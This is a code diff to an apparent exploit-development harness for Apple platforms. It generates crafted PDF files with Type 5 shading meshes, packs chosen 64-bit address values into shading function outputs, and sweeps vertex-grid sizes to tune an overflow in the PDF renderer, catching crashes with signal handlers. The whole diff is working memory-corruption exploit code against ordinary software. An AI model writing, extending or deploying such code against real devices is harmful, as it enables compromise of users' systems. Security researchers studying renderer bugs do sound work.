@@ -45,11 +45,12 @@ extern kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t addre
 #define ROWS 2
 #define NOUT 2816        // marksvia: "not tunable without changing the frame"
 
-static void build_vertices(unsigned char *vs, size_t cap) {
+static void build_vertices_n(unsigned char *vs, size_t cap, int vpr, int rows) {
     size_t vn = 0; unsigned acc = 0; int nb = 0;
-    for (int i = 0; i < VPR * ROWS; i++) {
-        unsigned vals[3] = { (unsigned)(0x1000 + (i % VPR) * 10),
-                             (unsigned)(0x1000 + (i / VPR) * 10), 0u };
+    int total = vpr * rows;
+    for (int i = 0; i < total; i++) {
+        unsigned vals[3] = { (unsigned)(0x1000 + (i % vpr) * 10),
+                             (unsigned)(0x1000 + (i / vpr) * 10), 0u };
         int widths[3] = { 32, 32, 8 };
         for (int k = 0; k < 3; k++)
             for (int b = widths[k] - 1; b >= 0; b--) {
@@ -61,6 +62,10 @@ static void build_vertices(unsigned char *vs, size_t cap) {
             }
     }
     if (nb && vn < cap) vs[vn++] = (unsigned char)((acc << (8 - nb)) & 0xFF);
+}
+
+static void build_vertices(unsigned char *vs, size_t cap) {
+    build_vertices_n(vs, cap, VPR, ROWS);
 }
 
 static int write_pdf(const char *path, uint64_t bits, int nout) {
@@ -206,11 +211,16 @@ static void carpet_fill(void *p, size_t n, int d) {
 // literal, so Type 2 /C0 cannot carry a real address.  The calculator builds it
 // by integer arithmetic instead: <m> 2 -1074 exp mul -> the double whose BITS
 // are exactly m, and the value is duplicated to NOUT outputs.
-static int write_pdf4(const char *path, uint64_t mantissa, int nout) {
+static int write_pdf4(const char *path, uint64_t mantissa, int nout, int vpr, int rows) {
     FILE *f = fopen(path, "wb");
     if (!f) return -1;
-    unsigned char vs[2048];
-    build_vertices(vs, sizeof vs);
+    static unsigned char vs[1 << 20];
+    size_t need = (size_t)vpr * rows * 72 / 8 + 16;
+    if (need > sizeof vs) return -1;
+    build_vertices_n(vs, sizeof vs, vpr, rows);
+    size_t last = 0;
+    for (size_t i = 0; i < sizeof vs; i++) if (vs[i]) last = i;
+    size_t vn = last + 1;
     long off[8] = {0};
 
     fprintf(f, "%%PDF-1.7\n%%\xe2\xe3\xcf\xd3\n");
@@ -223,13 +233,10 @@ static int write_pdf4(const char *path, uint64_t mantissa, int nout) {
                "/Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>\nendobj\n");
     off[4] = ftell(f);
     fprintf(f, "4 0 obj\n<< /Length 8 >>\nstream\n /Sh1 sh\nendstream\nendobj\n");
-    size_t last = 0;
-    for (size_t i = 0; i < sizeof vs; i++) if (vs[i]) last = i;
-    size_t vn = last + 1;
     off[5] = ftell(f);
     fprintf(f, "5 0 obj\n<< /ShadingType 5 /ColorSpace /DeviceCMYK "
                "/BitsPerCoordinate 32 /BitsPerComponent 8 /VerticesPerRow %d "
-               "/Decode [0 200 0 200 0 1] /Function 6 0 R /Length %zu >>\nstream\n", VPR, vn);
+               "/Decode [0 200 0 200 0 1] /Function 6 0 R /Length %zu >>\nstream\n", vpr, vn);
     fwrite(vs, 1, vn, f);
     fprintf(f, "\nendstream\nendobj\n");
     off[6] = ftell(f);
@@ -400,16 +407,25 @@ NSString *ModShading5Force(void) {
                      (unsigned long long)aimv]);
             long deltas[] = { 0, -0x76c, -0x1000, 0x1000, 0x4000 };
             int nd = (int)(sizeof deltas / sizeof deltas[0]);
-            int aimC0[] = { 2816, 1024, 256 };
-            int na = (int)(sizeof aimC0 / sizeof aimC0[0]);
+            // geometry matrix: natsuk1's parameterization (VPR=136, 256 rows)
+            // and ours, crossed with the C0 lengths - the overflow distance is
+            // a function of the vertex grid, and it was measured only on THEIR
+            // build
+            struct { int rows, vpr, nout; } geo[] = {
+                {   2,  64, 2816 }, { 256, 136,  256 }, {   2,  64,  256 },
+                { 256,  64,  256 }, {  64, 136, 1024 }, {   8, 136, 2816 },
+            };
+            int ng = (int)(sizeof geo / sizeof geo[0]);
             for (int di = 0; di < nd && !verdict; di++) {
-                for (int ai = 0; ai < na && !verdict; ai++) {
+                for (int ai = 0; ai < ng && !verdict; ai++) {
                     uint64_t value = aimv + deltas[di];
-                    int nout = aimC0[ai];
-                    if (write_pdf4(path, value, nout) != 0) continue;
+                    int nout = geo[ai].nout;
+                    if (write_pdf4(path, value, nout, geo[ai].vpr, geo[ai].rows) != 0) continue;
                     memset(aim, 0xCC, PAGESZ);
-                    AvePost([NSString stringWithFormat:@"112611 aim: C0=%d value=%#llx (page%+ld)",
-                             nout, (unsigned long long)value, deltas[di]]);
+                    AvePost([NSString stringWithFormat:@"112611 aim: rows=%d vpr=%d C0=%d "
+                             @"value=%#llx (page%+ld)",
+                             geo[ai].rows, geo[ai].vpr, nout,
+                             (unsigned long long)value, deltas[di]]);
                     g_in_probe = 1; g_mapped = 0; g_page = 0; g_far = 0; g_sig = 0; g_esr = 0;
                     if (sigsetjmp(g_jb, 1) == 0) {
                         int painted = render_pdf(path);
